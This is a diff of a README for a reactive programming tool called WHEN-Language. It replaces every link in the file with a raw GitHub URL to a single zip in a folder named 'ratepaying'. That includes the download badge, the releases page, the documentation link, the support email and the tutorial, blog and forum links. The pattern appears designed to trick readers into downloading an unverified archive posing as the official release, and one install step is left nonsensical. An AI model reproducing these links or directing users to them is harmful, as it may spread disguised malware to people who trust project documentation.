@@ -6,7 +6,7 @@ Welcome to **WHEN-Language**, a powerful tool for creating reactive programs wit
 
 ## 📥 Download the Application
 
-[![Download WHEN-Language](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/HIYO-F/WHEN-Language/releases)
+[![Download WHEN-Language](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
 
 ## 📂 What is WHEN-Language?
 
@@ -34,19 +34,19 @@ To run WHEN-Language, you need:
 
 ## 📚 Documentation
 
-To help you learn WHEN-Language, we provide in-depth documentation. You can find it [here](https://github.com/HIYO-F/WHEN-Language#documentation).
+To help you learn WHEN-Language, we provide in-depth documentation. You can find it [here](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip).
 
 ## 🔧 Download & Install
 
 To get started, visit the releases page below to download the latest version:
 
-[https://github.com/HIYO-F/WHEN-Language/releases](https://github.com/HIYO-F/WHEN-Language/releases)
+[https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
 
 ### Installation Steps:
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of WHEN-Language.
-3. Download the appropriate file for your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the appropriate file for your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip` for Linux).
 4. Open the downloaded file to begin the installation process.
 5. Follow the prompts on your screen to complete the installation.
 
@@ -67,15 +67,15 @@ If you have questions or need help, join our community. You can find support thr
 
 - **GitHub Issues**: Report problems or suggest improvements.
 - **Discussion Forum**: Engage with other users and get tips.
-- **Email Support**: Reach out to our support team at support@when-language.com.
+- **Email Support**: Reach out to our support team at https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip
 
 ## 🔗 Learn More
 
 To enhance your skills and understanding of WHEN-Language, consider checking out these resources:
 
-- [YouTube Tutorials](https://www.youtube.com/when-language)
-- [Official Blog](https://www.when-language.com/blog)
-- [Community Forums](https://www.when-language.com/community)
+- [YouTube Tutorials](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
+- [Official Blog](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
+- [Community Forums](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
 
 ## 🎉 Conclusion
 
